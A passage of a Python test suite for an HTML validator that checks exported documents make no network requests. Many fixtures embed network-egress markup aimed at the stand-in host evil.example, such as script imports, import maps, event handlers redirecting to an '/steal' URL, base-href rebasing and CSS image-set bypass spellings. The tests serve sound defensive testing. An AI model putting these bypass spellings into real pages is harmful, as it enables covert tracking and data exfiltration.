                errors, _ = self._errs_warns(build(body=self._body(MAIN, svg)))
                self.assertTrue(any("self-contained guarantee" in e and "<script %s" % attr in e
                                    for e in errors), (attr, errors))

    # The same false positive reached the CSP-predecessor rule, which decides whether a policy
    # `<meta>` comes too late to be the document's guarantee. It counted a bare `<script src>` in
    # the head as a fetching predecessor, so an inert data block parked before the policy marked it
    # `late`, the offline CSP requirement then saw no policy at all, and the document was rejected
    # with a different message for the very same request no browser makes.
    def test_a_head_data_block_src_does_not_make_the_offline_policy_late(self):
        doc = with_offline_mode(build(body=self._body(MAIN)))
        block = ('<script type="application/json" id="cmhHeadData" '
                 'src="https://evil.example/x.json">{"a": 1}</script>\n')
        doc = doc.replace("<head>\n", "<head>\n" + block, 1)
        # The fixture-shaped `replace` above is the only thing that puts the block before the
        # policy, so a `build()` that ever emits `<head >` or CRLF would make this a silent no-op
        # and the test would pass against the buggy code too. Fail loudly instead.
        self.assertIn(block, doc, "the head insertion did not take - the fixture shape moved")
        self.assertLess(doc.index(block), doc.index("Content-Security-Policy"),
                        "the block must precede the policy meta or this tests nothing")
        errors, _ = self._errs_warns(doc)
        self.assertEqual([e for e in errors if "Content-Security-Policy" in e or "evil.example" in e],
                         [], errors)

    # The inverse control: a script a browser really RUNS, placed the same way, must still make the
    # policy late. Without this the narrowing above could go all the way to "no script is ever a
    # predecessor" and nothing would notice.
    def test_a_head_executable_script_src_still_makes_the_offline_policy_late(self):
        doc = with_offline_mode(build(body=self._body(MAIN)))
        block = '<script src="https://evil.example/x.js"></script>\n'
        doc = doc.replace("<head>\n", "<head>\n" + block, 1)
        self.assertIn(block, doc, "the head insertion did not take - the fixture shape moved")
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("Content-Security-Policy" in e and "after an element that can fetch"
                            in e for e in errors), errors)

    # CMH-VAL-25 inherits the top-level verdict element for element, so the nested spelling of a
    # data block's inert `src` is clean too, and the nested spelling of a live one is not.
    def test_the_nested_read_inherits_the_data_block_verdict(self):
        inert = ('&lt;script type=&quot;application/json&quot; '
                 'src=&quot;https://evil.example/x.json&quot;&gt;&lt;/script&gt;')
        errors, warnings = self._errs_warns(
            build(body=self._body(MAIN, '<iframe srcdoc="%s"></iframe>' % inert)))
        self.assertEqual(errors, [], errors)
        self.assertEqual([w for w in warnings if not validate.is_advisory(w)], [], warnings)
        live = ('&lt;script type=&quot;text/javascript&quot; '
                'src=&quot;https://evil.example/x.js&quot;&gt;&lt;/script&gt;')
        errors, _ = self._errs_warns(
            build(body=self._body(MAIN, '<iframe srcdoc="%s"></iframe>' % live)))
        self.assertTrue(
            any('carries a nested <script src="https://evil.example/x.js">' in e
                for e in errors), errors)
        # ...and the nested arm is scoped to `src` exactly as the top-level one is: a data-block
        # TYPE must not smuggle an SVG `href` / `xlink:href` past the nested rule either. Without
        # this, dropping `attr == "src"` from the nested guard would pass every other test here,
        # because the pre-existing nested SVG cases carry no `type` at all.
        for attr in ("href", "xlink:href"):
            svg = ('&lt;script type=&quot;application/json&quot; %s=&quot;'
                   'https://evil.example/x.js&quot;&gt;&lt;/script&gt;' % attr)
            with self.subTest(attr=attr):
                errors, _ = self._errs_warns(
                    build(body=self._body(MAIN, '<iframe srcdoc="%s"></iframe>' % svg)))
                self.assertTrue(
                    any('carries a nested <script %s="https://evil.example/x.js">' % attr in e
                        for e in errors), (attr, errors))

    # A `speculationrules` or `importmap` block is ACTIVE but is not JavaScript, so the
    # executable-type predicate never looked at it: a speculation ruleset makes the browser
    # prefetch/prerender (a `"source": "document"` one needs no URL literal at all), and an import
    # map re-points where a bare module specifier resolves - which the literal
    # `import "https://..."` scan cannot see. The exporter removes every ruleset and every import
    # map that is not entirely relative, so the gate must reject a hand-authored offline file that
    # keeps one, in every spelling JSON allows.
    def test_offline_mode_rejects_active_data_blocks(self):
        cases = (
            ("speculationrules", "", '{"prerender": [{"urls": ["https://evil.example/beacon"]}]}'),
            # No URL literal anywhere: the ruleset prefetches the document's own links.
            ("speculationrules", "", '{"prefetch": [{"source": "document"}]}'),
            # Even a purely relative ruleset goes: it exists only to fetch.
            ("speculationrules", "", '{"prerender": [{"urls": ["next.html"]}]}'),
            # An external ruleset or map is unreviewable and cannot be self-contained.
            ("speculationrules", ' src="rules.json"', ""),
            ("importmap", ' src="map.json"', '{"imports": {"lib": "./lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "https://evil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "//evil.example/lib.js"}}'),
            # A backslash opens an authority for a special scheme exactly as a slash does.
            ("importmap", "", '{"imports": {"lib": "/\\\\evil.example/lib.js"}}'),
            # JSON permits an escaped solidus and a \\uXXXX escape for any character, and the URL
            # parser strips padding and an embedded tab - a text scan closes one of these.
            ("importmap", "", '{"imports": {"lib": "https:\\/\\/evil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "https:\\u002f\\u002fevil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "  https://evil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "htt\\tps://evil.example/lib.js"}}'),
            # A data:/blob: target maps a bare specifier onto code the document never carried.
            ("importmap", "", '{"imports": {"lib": "data:text/javascript,export default 1"}}'),
            ("importmap", "", '{"imports": {"lib": "blob:https://evil.example/x"}}'),
            # A scopes KEY is a reference too.
            ("importmap", "", '{"scopes": {"https://cdn.example/": {"lib": "./lib.js"}}}'),
            # A browser hard-fails an unparseable map, so failing closed loses nothing.
            ("importmap", "", "not json at all"),
        )
        for stype, attr, body in cases:
            with self.subTest(type=stype, attr=attr, body=body):
                block = '<script type="%s"%s>%s</script>' % (stype, attr, body)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any("offline mode" in e and stype in e for e in errors),
                                (stype, attr, body, errors))

    # The controls: an entirely relative import map is legitimate content and must survive, and a
    # MIME-parameter type is NOT one of these keyword types, so it is inert data a browser ignores
    # and the gate must leave alone (deleting an author's inert block is the costlier error).
    def test_offline_mode_accepts_local_and_parameterized_active_data_blocks(self):
        blocks = (
            '<script type="importmap">{"imports": {"lib": "./lib.js", "app": "/app.js"}}</script>',
            '<script type="importmap">{"scopes": {"/inner/": {"lib": "./inner.js"}}}</script>',
            '<script type="importmap;charset=utf-8">'
            '{"imports": {"lib": "https://evil.example/lib.js"}}</script>',
            '<script type="text/plain">{"prerender": [{"urls": ["https://evil.example/x"]}]}</script>',
        )
        errors, warnings = self._errs_warns(
            with_offline_mode(build(body=self._body(MAIN, "\n".join(blocks)))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # `<template>` content is preserved verbatim by serialization and a second script can adopt
    # and insert it, so the exporter's inline-egress scan now descends into it. The validator's
    # parser deliberately drops template content, so it could not see such a script at all - which
    # is exactly the disagreement that would let --strict bless a file the exporter strips.
    def test_offline_egress_check_sees_a_template_parked_script(self):
        cases = (
            ('<script type="text/javascript">import("https://evil.example/x.js");</script>',
             "imports a network module"),
            ('<script type="text/javascript">window.location.href = "https://evil.example/steal";</script>',
             "direct top-level "),
            ('<script type="importmap">{"imports": {"lib": "https://evil.example/lib.js"}}</script>',
             "importmap"),
            ('<script type="speculationrules">{"prefetch": [{"source": "document"}]}</script>',
             "speculationrules"),
        )
        for inner, needle in cases:
            with self.subTest(inner=inner):
                block = "<template id=\"parked\">\n%s\n</template>" % inner
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any(needle in e for e in errors), (inner, errors))
                # ...and the same block nested a second template deep, which is what the exporter's
                # recursive walk exists for.
                nested = "<template id=\"outer\"><template id=\"inner\">\n%s\n</template></template>" % inner
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, nested))))
                self.assertTrue(any(needle in e for e in errors), ("nested", inner, errors))

    def test_offline_egress_check_sees_a_script_nested_in_a_template_parked_script(self):
        # CMH-VAL-21: inside a template a `<svg><script>` holds MARKUP too, so a SECOND script
        # nested in an inert one is a real element the exporter's recursive walk carries - with
        # its OWN attributes. While the parked capture was one scalar opened only when empty,
        # only the outer `text/plain` record reached `template_scripts` and the inner
        # EXECUTABLE script's import was skipped, recreating the validator/exporter mismatch the
        # template scan exists to close.
        block = ('<template id="parked"><svg><script type="text/plain">'
                 '<script type="text/javascript">import("https://evil.example/x.js");</script>'
                 "</script></svg></template>")
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        self.assertTrue(any("imports a network module" in e for e in errors), errors)

    def test_offline_check_sees_a_style_nested_in_a_template_parked_style(self):
        block = ('<template id="parked-css"><svg><style>'
                 "<style>.x { background-image: url(https://evil.example/bg.png); }</style>"
                 "</style></svg></template>")
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        self.assertTrue(any("offline mode" in e and "url(" in e for e in errors), errors)

    def test_offline_check_sees_template_parked_network_css(self):
        block = ('<template id="parked-css">\n'
                 "<style>.x { background-image: url(https://evil.example/bg.png); }</style>\n"
                 '<p style="background: url(//evil.example/inline.png)">x</p>\n'
                 "</template>")
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        for needle in ("style block", "inline style"):
            self.assertTrue(any("offline mode" in e and "url(" in e and needle in e for e in errors),
                            (needle, errors))

    # The control: a template holding only local content is legitimate and must stay clean.
    def test_offline_check_accepts_a_local_template(self):
        block = ('<template id="ok">\n'
                 '<style>.x { color: #123456; }</style>\n'
                 '<script type="text/javascript">window.__ok = 1;</script>\n'
                 '<script type="importmap">{"imports": {"lib": "./lib.js"}}</script>\n'
                 '<img src="data:image/png;base64,AAAA" alt="x">\n'
                 "</template>")
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # The exporter removes every `on*` attribute; a gate that did not look would certify a
    # hand-authored offline file the export would have changed - and an inline handler is exactly
    # the channel the offline CSP cannot close.
    def test_offline_mode_rejects_inline_event_handlers(self):
        for block in ('<button id="go" onclick="location.href=\'https://evil.example/x\'">go</button>',
                      '<img id="pixel" alt="x" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" '
                      'onload="location.href=\'https://evil.example/x\'">',
                      '<template id="parked-handler"><button onclick="alert(1)">go</button></template>'):
            with self.subTest(block=block):
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any("the export scrubs it" in e for e in errors), (block, errors))

    def test_offline_mode_rejects_an_on_prefixed_attribute_that_is_not_a_handler(self):
        # The gate's test is the exporter's literal `^on`, which also takes `once` and `onward` -
        # the exporter really does `removeAttribute("once")`, so a validator that were cleverer
        # than the strip would bless an attribute the export removes. The message must then claim
        # only what the predicate decides, not assert that the attribute runs code.
        block = '<div id="probe" once="1" onward="x">text</div>'
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        for attr in ("once", "onward"):
            # The FORMATTED head, which names one attribute, rather than a phrase the static
            # message text carries anyway - otherwise both iterations assert the same thing and a
            # drift that flagged only one of the two would stay green.
            self.assertTrue(any('<div %s="...">' % attr in e for e in errors), (attr, errors))

    def test_offline_mode_rejects_an_event_handler_only_a_dom_walk_reaches(self):
        # The exporter scrubs `on*` off every element `querySelectorAll("*")` reaches on a
        # DOMParser document, where scripting is OFF - so it reaches a self-closed FOREIGN
        # element and the markup inside a `<noscript>`. The gate read the document parser's
        # start-tag scan instead, which RETURNS before that scan for a self-closed foreign
        # element and sees a `<noscript>` body as raw TEXT, so both shapes rode into a file
        # `--strict` then certified as offline-clean.
        for block in ('<svg viewBox="0 0 1 1"><rect width="1" height="1" '
                      'onload="location.href=\'https://evil.example/x\'"/></svg>',
                      '<noscript><button onclick="location.href=\'https://evil.example/x\'">'
                      "go</button></noscript>",
                      '<template id="parked-svg"><svg><rect onload="alert(1)"/></svg></template>'):
            with self.subTest(block=block):
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any("the export scrubs it" in e for e in errors), (block, errors))

    def test_offline_mode_accepts_a_document_without_event_handlers(self):
        block = ('<button id="go" data-onclick="not a handler">go</button>'
                 '<svg viewBox="0 0 1 1"><rect width="1" height="1" fill="#123456"/></svg>'
                 '<noscript><p data-only="text">enable scripting</p></noscript>')
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # A <base href> loads nothing itself, so neither this gate nor the export strip looked at one -
    # and both treat a RELATIVE reference as safe, which is the whole control case. A base element
    # REBASES every relative reference in the document onto the base it names, so the very relative
    # image or script reference both sides read as local fetches off-host instead. The exporter
    # clears the same attribute, so the gate has to see it too or the two disagree (#924).
    #
    # The spellings matter here in a way they do not for a single resource: a base is held to the
    # stricter `offline_is_non_local_ref` rather than the `//`-requiring network predicate, because
    # a browser resolves `https:evil.example/` and `https:/\evil.example/` to a remote host too and
    # for a base that would defeat the whole check (a #923 residual the CSP absorbs for one
    # attribute is a document-wide rebase here).
    def test_offline_mode_rejects_a_base_href_that_points_at_the_network(self):
        beacon = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="beacon.png" alt="x">')
        # The pairing this row exists for: the relative reference alone is NOT an error.
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(beacon))))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("local path" in w for w in warnings), warnings)
        cases = (
            '<base href="https://evil.example/">',
            '<base href="//evil.example/">',
            # A browser strips leading C0 controls and spaces before it parses a URL.
            '<base href=" \thttps://evil.example/">',
            # Slash-less and backslash spellings a WHATWG URL parser still resolves to a host.
            '<base href="https:evil.example/">',
            '<base href="https:/evil.example/">',
            '<base href="https:/\\evil.example/">',
            # An SMB/UNC authority leaks credentials from a file:// document.
            '<base href="file://evil.example/share/">',
            '<base href="\\\\evil.example\\share\\">',
            # A scheme the file cannot resolve on its own is non-local however it is spelled.
            '<base href="blob:https://evil.example/x">',
            # A template-parked base is inert until a script adopts the fragment and inserts it,
            # which is when it starts rebasing - the same reason the other offline checks walk in.
            '<template id="parked-base"><base href="https://evil.example/"></template>',
        )
        for base in cases:
            with self.subTest(base=base):
                doc = with_offline_mode(build(body=self._body(beacon, base)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("offline mode" in e and "<base href" in e for e in errors),
                                (base, errors))

    # The self-contained guarantee is not offline-only, and unlike offline a shareable file has no
    # zero-network CSP behind it - so a shareable document that rebases its relative references onto
    # a remote host is an error there too.
    def test_shareable_mode_rejects_a_base_href_that_points_at_the_network(self):
        for base in ('<base href="https://evil.example/">', '<base href="https:evil.example/">'):
            with self.subTest(base=base):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, base)))
                self.assertTrue(any("self-contained guarantee" in e and "<base href" in e
                                    for e in errors), (base, errors))

    # The control: a relative base still resolves inside the file's own directory, so it reaches no
    # network and must be left alone - removing it would break an author's local reference set.
    def test_offline_mode_accepts_a_relative_base_href(self):
        for base in ('<base href="assets/">', '<base href="./assets/">', '<base href="/assets/">',
                     '<base href="">', '<base target="_blank">'):
            with self.subTest(base=base):
                doc = with_offline_mode(build(body=self._body(MAIN, base)))
                errors, warnings = self._errs_warns(doc)
                self.assertEqual(errors, [], (base, errors))
                self.assertEqual(warnings, [], (base, warnings))

    # -- the shareable self-contained guarantee covers every automatic subresource load ------ #
    # CMH-VAL-08 (#1145). The gate used to report a network reference in SHAREABLE mode on five
    # element/attribute groups only (`img`, `script`, `iframe`, a loading `link`, and `base`); the
    # whole media/CSS/background set sat inside the `offline_mode` branch, so a stamped shareable
    # file could still carry `<video src="https://...">` and fetch on open. Unlike offline there is
    # no zero-network CSP behind a shareable file, so this gate is the only layer.
    def test_shareable_mode_rejects_a_network_media_load(self):
        for markup, needle in (
                ('<video src="https://evil.example/v.mp4"></video>', "<video src"),
                ('<video poster="https://evil.example/p.png"></video>', "<video poster"),
                ('<audio src="https://evil.example/a.mp3"></audio>', "<audio src"),
                ('<video><source src="https://evil.example/v.webm"></video>', "<source src"),
                ('<picture><source srcset="https://evil.example/x.png 1x"></picture>',
                 "<source srcset"),
                ('<video><track src="https://evil.example/c.vtt"></video>', "<track src"),
                ('<object data="https://evil.example/x.swf"></object>', "<object data"),
                ('<embed src="https://evil.example/x.swf">', "<embed src"),
                ('<input type="image" src="https://evil.example/x.png">', "<input src"),
                ('<svg><image href="https://evil.example/x.png"/></svg>', "<image href"),
                ('<svg><image xlink:href="https://evil.example/x.png"/></svg>',
                 "<image xlink:href"),
                ('<svg><use href="https://evil.example/x.svg#i"/></svg>', "<use href"),
                ('<svg><use xlink:href="https://evil.example/x.svg#i"/></svg>', "<use xlink:href"),
                ('<svg><filter id="f"><feImage href="https://evil.example/x.png"/></filter></svg>',
                 "<feimage href"),
                ('<svg><filter id="f"><feImage xlink:href="https://evil.example/x.png"/></filter>'
                 "</svg>", "<feimage xlink:href")):
            with self.subTest(markup=markup):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("self-contained guarantee" in e and needle in e
                                    for e in errors), (markup, errors))

    def test_shareable_mode_rejects_a_network_background_attribute(self):
        # Asked as an ATTRIBUTE question, not a tag question, so it matches the export strip's own
        # universal `[background]` selector. The hand-maintained tag list it replaced named
        # `body`/`table`/`td`/`th`/`div` and so MISSED the table parts, where `background` really is
        # a presentation hint that fetches - `<tr background="https://...">` validated clean.
        for tag in ("body", "table", "td", "th", "div", "tr", "tbody", "thead", "tfoot"):
            with self.subTest(tag=tag):
                inner = '<%s background="https://evil.example/bg.png"></%s>' % (tag, tag)
                markup = ("<table><tr>%s</tr></table>" % inner if tag in ("td", "th") else
                          "<table>%s</table>" % inner if tag in ("tr", "tbody", "thead", "tfoot")
                          else inner)
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("self-contained guarantee" in e and "<%s background" % tag in e
                                    for e in errors), (markup, errors))

    # An SVG PRESENTATION ATTRIBUTE whose value is a `url(...)` reference reached the network past
    # every egress surface (issue #1186): the CSS reads look at a `style=` attribute and a `<style>`
    # body, and the element rules are keyed on (tag, attribute) pairs whose whole VALUE is a URL -
    # so `<rect mask="url(https://evil.example/x.svg#m)">` validated STRICT-CLEAN, was stamped, and
    # fetched the moment a recipient opened it. Which attributes carry the channel is decided by
    # MEASUREMENT (tests/62-deck-regressions.spec.js) and not by the spec's list of properties that
    # accept a `<url>`.
    def test_shareable_mode_rejects_a_network_url_in_a_presentation_attribute(self):
        for attr in resources.SVG_URL_PRESENTATION_ATTRS:
            for value in ('url(https://evil.example/x.svg#r)',
                          "url(&quot;//evil.example/x.svg#r&quot;)",
                          "url(https:evil.example/x.svg#r)"):
                markup = ('<svg width="10" height="10" aria-label="p"><rect width="10" '
                          'height="10" %s="%s"/></svg>' % (attr, value))
                with self.subTest(attr=attr, value=value):
                    errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                    needle = "presentation attribute %s on <rect>" % attr
                    self.assertTrue(any("self-contained guarantee" in e and needle in e
                                        and "url(" in e for e in errors), (attr, value, errors))

    def test_offline_mode_rejects_a_network_url_in_a_presentation_attribute(self):
        markup = ('<svg width="10" height="10" aria-label="p"><rect width="10" height="10" '
                  'clip-path="url(https://evil.example/x.svg#c)"/></svg>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
        self.assertTrue(any("offline mode" in e and "presentation attribute clip-path on <rect>"
                            in e for e in errors), errors)

    # The no-false-positive control: the ordinary way these attributes are written points INSIDE
    # the document (`url(#clip)`) or names a paint that is not a reference at all, and a gate that
    # rejected those would break every legitimate SVG in a report.
    def test_a_local_presentation_attribute_reference_is_clean(self):
        markup = ('<svg width="10" height="10" aria-label="p">'
                  '<defs><clipPath id="c"><rect width="5" height="5"/></clipPath></defs>'
                  '<rect width="10" height="10" clip-path="url(#c)" fill="#336699" '
                  'stroke="none" mask="url(\'#m\')" '
                  'marker-start="url(&quot;data:image/gif;base64,R0lGODlhAQABAAAAACw=&quot;)"/>'
                  "</svg>")
        errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # `mask` takes an IMAGE, so a bare remote string inside `image-set(...)` fetches from it with
    # no `url()` wrapper at all (measured). The reading is deliberately NARROWER than the `url()`
    # one - only the attributes measured to fetch an image carry it, because reporting a candidate
    # on a paint or a shape reference would reject a document that fetches nothing - and it is
    # SHAREABLE-only for the reason the `style=` one is (CMH-VAL-08): offline has the zero-network
    # CSP behind it, and widening the offline gate alone would reject a file the export's
    # `_offlineCssNoNetwork` just produced.
    def test_shareable_mode_rejects_a_network_image_set_in_a_presentation_attribute(self):
        # Both image-taking attributes, each written the way a browser HONOURS it - `cursor` needs
        # its fallback keyword, and probing it without one is what hid this leak in round 2.
        for attr, value in (
                ("mask", "image-set(&quot;https://evil.example/m.png&quot; 1x)"),
                ("cursor", "image-set(&quot;https://evil.example/c.cur&quot; 1x), auto")):
            markup = ('<svg width="10" height="10" aria-label="p"><rect width="10" height="10" '
                      '%s="%s"/></svg>' % (attr, value))
            with self.subTest(attr=attr):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("self-contained guarantee" in e and "image-set(" in e
                                    and "presentation attribute %s on <rect>" % attr in e
                                    for e in errors), errors)
                errors, _ = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertEqual([e for e in errors if "image-set(" in e], [], errors)

    # ... and the no-false-positive control the scope exists for: an attribute that takes a PAINT or
    # a shape reference fetches nothing from an `image-set()` candidate (measured), so reporting one
    # would refuse a document with no egress at all.
    def test_an_image_set_on_a_non_image_presentation_attribute_is_clean(self):
        for attr in ("fill", "stroke", "clip-path", "marker-start", "filter"):
            markup = ('<svg width="10" height="10" aria-label="p"><rect width="10" height="10" '
                      '%s="image-set(&quot;https://evil.example/x.png&quot; 1x)"/></svg>' % attr)
            with self.subTest(attr=attr):
                errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertEqual([e for e in errors if "image-set(" in e], [], errors)
                self.assertEqual(warnings, [], warnings)

    # The nested walk mirrors the top-level set, so the same reference written inside an
    # `<iframe srcdoc>` is reported too (CMH-VAL-25).
    def test_a_nested_presentation_attribute_inside_a_srcdoc_is_an_error(self):
        nested = ("&lt;svg&gt;&lt;rect mask=&quot;url(https://evil.example/m.svg#m)&quot;/&gt;"
                  "&lt;/svg&gt;")
        markup = '<iframe srcdoc="%s"></iframe>' % nested
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertTrue(any("carries a nested presentation attribute mask on <rect>" in e
                            for e in errors), errors)

    def test_shareable_mode_rejects_network_css_egress(self):
        css = CSS_REGION.replace(
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }",
            '@import "https://evil.example/theme.css";\n'
            ":root { --cp-bg: #ffffff; --cp-text: #000000; "
            "background-image: url(https://evil.example/bg.png); }")
        main = MAIN.replace("<p>content</p>",
                            '<p style="background: url(//evil.example/inline.png)">content</p>')
        errors, _ = self._errs_warns(build(css=css, body=self._body(main)))
        for needle in ("@import", "style block", "inline style"):
            self.assertTrue(any("self-contained guarantee" in e and needle in e for e in errors),
                            "expected a shareable CSS error for %s, got %r" % (needle, errors))
        self.assertFalse(any("offline mode" in e for e in errors), errors)

    # `image-set()` takes a BARE string candidate with no `url()` wrapper, so the shared `url()`
    # pattern cannot see it at all: `image-set("https://evil.example/x.png" 1x)` in a `<style>`
    # block or a `style=` attribute validated STRICT-CLEAN and was handed the
    # `commentable-html-validated` stamp (issue #1166, measured by the #1145 review panel). The
    # deck gate already read it; the strict gate now asks the same shared reader.
    def test_shareable_mode_rejects_a_network_image_set_candidate(self):
        for value, needle in (
                ('image-set("https://evil.example/x.png" 1x)', "style block"),
                ("image-set('//evil.example/x.png' 1x)", "style block"),
                ("image-set('https:evil.example/x.png' 1x)", "style block"),
                ("image-set('https:/evil.example/x.png' 1x)", "style block"),
                # A later candidate is the one a 2x-DPR browser fetches, and a nested `url(...)`
                # or `type(...)` paren must not hide it.
                ("image-set('local.png' 1x, '//evil.example/x.png' 2x)", "style block"),
                ('image-set(url("local.png") 1x, "https://evil.example/x.png" 2x)', "style block"),
                ("-webkit-image-set('//evil.example/x.png' 1x)", "style block")):
            markup = "<style>.a { background-image: %s; }</style>" % value
            with self.subTest(value=value):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("self-contained guarantee" in e and "image-set(" in e
                                    and needle in e for e in errors), (value, errors))
        for markup in ('<div style=\'background-image: image-set("https://evil.example/x.png" 1x)\'>'
                       "f</div>",
                       "<div style=\"background-image: image-set('local.png' 1x, "
                       "'//evil.example/x.png' 2x)\">f</div>"):
            with self.subTest(inline=markup):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any("self-contained guarantee" in e and "image-set(" in e
                                    and "inline style on <div>" in e for e in errors),
                                (markup, errors))

    # CMH-VAL-25: the nested read mirrors the top-level set, so the same candidate written inside an
    # `<iframe srcdoc>` is reported too - that walk is shareable-only, so it needs no mode test.
    def test_a_nested_image_set_candidate_inside_a_srcdoc_is_an_error(self):
        for nested, clause in (
                ("&lt;p style=&quot;background-image:image-set('//evil.example/x.png' 1x)&quot;&gt;"
                 "&lt;/p&gt;",
                 "carries a nested inline style on <p> with a network image-set("),
                ("&lt;style&gt;.a{background-image:image-set('https://evil.example/x.png' 1x)}"
                 "&lt;/style&gt;",
                 "carries a nested <style> block with a network image-set(")):
            markup = '<iframe srcdoc="%s"></iframe>' % nested
            with self.subTest(nested=nested):
                errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
                self.assertTrue(any(clause in e for e in errors),
                                "expected %r for %r, got %r" % (clause, nested, errors))

    # The no-false-positive control: a candidate that resolves inside the file reaches no network,
    # and an EMPTY authority (`//`) is a parse failure that fetches nothing, so neither may be
    # reported - a gate that rejects a document with no egress at all is the one failure mode this
    # check cannot afford.
    def test_shareable_mode_accepts_a_local_or_data_image_set_candidate(self):
        markup = ("<style>.a { background-image: image-set('local.png' 1x, './img/y.png' 2x); }\n"
                  ".b { background-image: image-set(url('local.png') 1x, "
                  "'data:image/gif;base64,R0lGODlhAQABAAAAACw=' 2x); }\n"
                  ".c { background-image: image-set('//' 1x); }\n"
                  ".d { background-image: image-set(url(x.png) type('image/png')); }</style>"
                  "<div style=\"background-image:image-set('local.png' 1x)\">f</div>")
        errors, warnings = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # The SCOPE decision, pinned so it cannot drift into a silent widening (#1166). Offline mode
    # deliberately does NOT read `image-set()`: there the zero-network CSP, not the parser-level
    # pattern, is what enforces fetch egress (CMH-SEC-06, the ground #1007 and #1029 were closed
    # on), and widening the gate alone would make it reject a file the exporter's
    # `_offlineCssNoNetwork` had just produced - the #961 precedent and the CMH-OFFLINE-04 drift.
    # The `url()` reading beside it must still fire in offline mode, so this is a scope test and
    # not a "CSS is unchecked offline" test.
    def test_offline_mode_leaves_the_image_set_reading_to_its_csp(self):
        markup = ("<style>.a { background-image: image-set('https://evil.example/x.png' 1x); }"
                  "</style>"
                  "<div style=\"background-image:image-set('//evil.example/y.png' 1x)\">f</div>")
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
        self.assertEqual([e for e in errors if "image-set(" in e], [], errors)
        wrapped = "<style>.a { background-image: url(https://evil.example/x.png); }</style>"
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, wrapped))))
        self.assertTrue(any("offline mode" in e and "style block contains a network url("
                            in e for e in errors), errors)

    # One declaration that spells BOTH readings is one finding, not two: a candidate that IS a
    # `url(...)` function belongs to the `url()` reading, so the bare-string one skips it. But the
    # two readings are otherwise INDEPENDENT - a `url()` hit in one rule must not suppress an
    # `image-set()` in a DIFFERENT rule of the same block, which an `elif` did (round-1 panel).
    def test_a_declaration_that_spells_both_css_readings_is_reported_once(self):
        markup = ("<style>.a { background-image: image-set(url(https://evil.example/x.png) 1x); }"
                  "</style>")
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        css = [e for e in errors if "style block contains a network" in e]
        self.assertEqual(len(css), 1, errors)
        self.assertIn("url(", css[0])
        self.assertNotIn("image-set(", css[0])

    def test_a_network_url_in_one_rule_does_not_hide_an_image_set_in_another(self):
        markup = ("<style>.a { background: url(https://evil.example/a.png); }\n"
                  ".b { background-image: image-set('//evil.example/b.png' 1x); }</style>")
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
        self.assertTrue(any("style block contains a network url(" in e for e in errors), errors)
        self.assertTrue(any("style block contains a network image-set(" in e for e in errors),
                        errors)
        inline = ('<div style="background:url(https://evil.example/a.png);'
                  "background-image:image-set('//evil.example/b.png' 1x)\">f</div>")
        errors, _ = self._errs_warns(build(body=self._body(MAIN, inline)))
        self.assertTrue(any("inline style on <div> contains a network url(" in e for e in errors),
                        errors)
        self.assertTrue(any("inline style on <div> contains a network image-set(" in e
                            for e in errors), errors)

    # The nested walk mirrors the top-level set, so the independent-reading property has to hold
    # there too - an `elif` regression on the nested path alone would otherwise stay green.
    def test_a_nested_network_url_does_not_hide_a_nested_image_set(self):
        nested = ("&lt;style&gt;.a{background:url(https://evil.example/a.png)}\n"
                  ".b{background-image:image-set('//evil.example/b.png' 1x)}&lt;/style&gt;")
        markup = '<iframe srcdoc="%s"></iframe>' % nested
        errors, _ = self._errs_warns(build(body=self._body(MAIN, markup)))
